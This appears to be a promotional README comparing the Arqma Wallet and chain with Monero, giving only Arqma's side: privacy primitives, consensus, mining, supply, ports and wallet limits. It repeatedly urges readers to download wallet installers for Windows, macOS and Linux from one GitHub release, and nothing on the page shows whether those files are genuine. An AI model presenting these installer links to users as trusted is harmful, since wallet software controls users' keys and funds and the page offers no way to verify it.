![Arqma Wallet](assets/banner-article.png)

<h1 align="center">Arqma Wallet versus Monero: comparing on stated facts</h1>

<p align="center">Where the two chains differ on privacy, supply and node economics.</p>

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

Arqma is a privacy-oriented chain, and readers arrive asking how it compares with another chain of the same kind. The question is fair, and a comparison of this sort is easy to write badly. This page does the narrower thing: it states what Arqma's own documentation establishes, precisely enough that a reader can hold it against the other project's documentation rather than against a summary of it.

## Why the comparison is bounded this way

Every claim in this article about Arqma comes from the project's published facts. No claim is made here about Monero's parameters, its fees, its supply or its release schedule, because none were verified for this page.

That is not evasion; it is the difference between a comparison and a list of assertions, and the difference is whether a reader can check each line against something that was actually published. A reader who wants the other column should read it from that project's own material, where it can be checked.

## Privacy, on both sides of the sentence

Arqma's chain-level privacy comes from three documented primitives: ring signatures, one-time stealth addresses, and RingCT. Together they obscure who authorised a transfer, where it went and how much it carried.

That technique family is shared ground with other privacy chains, which is why readers arrive looking for a comparison at all. What follows is the Arqma side only, stated as the project states it. [Arqma Wallet privacy guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-privacy-anonymity.md) covers the primitives in detail.

## Consensus, which is where the designs diverge

Arqma's consensus is a hybrid of proof of work and proof of stake through Service Nodes. A Service Node stakes a fixed amount of ARQ and needs a public IP address and uptime.

That hybrid shape is the single largest structural difference a reader will encounter, and it is stated here for Arqma's side only. Miners produce blocks; Service Nodes provide the staking half.

## Mining

The algorithm is RandomARQ, a RandomX-family design built to be CPU-friendly and resistant to ASICs and NiceHash-style rental markets. Solo mining runs from a full node, and the desktop wallet can run a bundled daemon with a solo-mining sidecar.

The mobile builds have no mining, which is a property of the mobile software rather than of the algorithm. [mining ARQ to a wallet](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-mining.md) covers the two routes.

## Supply

The main emission curve totals roughly 18.4 million ARQ, with a perpetual tail emission continuing after it.

That is a specific structure and it is stated with the project's own numbers. Any comparison to another chain's emission belongs beside that chain's own published figure, not beside a memory of it.

## The wallet itself

This is where the comparison is least about the chain. The wallet is the official open-source wallet for Arqma: a desktop GUI for Windows, macOS and Linux, command-line binaries, and native mobile apps.

There is no hardware-wallet flow in the current builds, and the documented cold-storage equivalent is the desktop wallet on an offline machine. That is a real limitation and it is stated as one. [Arqma Wallet cold storage](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-cold-storage.md) covers what the setup can and cannot do.

## Block time and confirmations

Blocks target two minutes, and ten confirmations  -  roughly twenty minutes  -  is the point at which wallets and merchants treat a transfer as settled.

Timing is one of the few things a user experiences directly, which is why it belongs in a comparison at all: it decides how long a payment feels unfinished.

## Addresses and finality

An ARQ address is 95 characters beginning with `ar`, and no payment ID is needed for a normal send. Sends are final once broadcast.

Stating it is still necessary, because it is the property that makes every address check happen before the send. [Arqma Wallet address format](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-address-format.md) covers what to verify.

## Node operation

The default connection is a remote node, and the mobile apps always use one. A local node  -  `arqmad` with the wallet pointed at `127.0.0.1`  -  is the documented setup where no third party sees network activity.

The ports are published: 19993 for peer traffic, 19994 for RPC, 19995 for ZMQ, 19996 for the service-node listener, 19999 for the storage server paired with RPC. [Arqma full node guide](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-full-node.md) covers the arrangement, and [Arqma remote node safety](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-remote-node-safety.md) what it buys.

## What the wallet is not

It is single-chain: ARQ only, with no multi-chain support and no smart-contract layer. It is not an exchange and cannot buy or sell crypto, and the swap screens sign locally.

It also has no account, no email and no KYC step, and the software carries no telemetry. Those are statements about this wallet, not about any other. [Arqma project status](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-project-status.md) covers the project's structure and how it is funded, which is the non-technical half of any comparison.

## How to finish the comparison yourself

Four columns settle most of it: consensus, mining algorithm, emission, and block time. Take Arqma's from the four sections above, then take the other project's from its own published documentation.

Anything that cannot be filled from a primary source is not a difference; it is a gap. That rule is worth applying to both sides equally, including to this page.

If a figure cannot be found in a primary source, leaving the row empty is more accurate than filling it from a summary article  -  this one included. The current release from the [Arqma Wallet v0.5.1.2 release](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2) is the build the Arqma statements here describe. [which Arqma Wallet build is current](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-which-build-is-current.md) covers how to check what this project actually ships.

## FAQ

### What privacy primitives does Arqma use?

Ring signatures, one-time stealth addresses and RingCT, with optional view keys for selective disclosure.

### How does the consensus differ from a pure proof-of-work chain?

It is a hybrid: miners do proof of work, and Service Nodes provide proof of stake plus routing and storage.

### What is the block time?

Two minutes, with ten confirmations  -  roughly twenty minutes  -  treated as settled.

### Does Arqma Wallet support a hardware wallet?

No. The desktop wallet on an offline machine is the documented equivalent.

### Is this comparison neutral?

It states Arqma's verified facts and makes no claims about Monero's parameters, which belong to Monero's own documentation.

---

## Download Arqma Wallet

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

---

## Related Arqma Wallet guides

| Guide | What it answers |
| --- | --- |
| [Arqma Wallet privacy guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-privacy-anonymity.md) | What the chain reveals, what the node sees, and where KYC enters. |
| [Arqma Wallet seed phrase guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-seed-phrase.md) | The 25 words, what they regenerate, and the one moment they are shown. |
| [Arqma Wallet download and verify](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-download-and-verify.md) | Checking a downloaded installer against its published hash before you run it. |
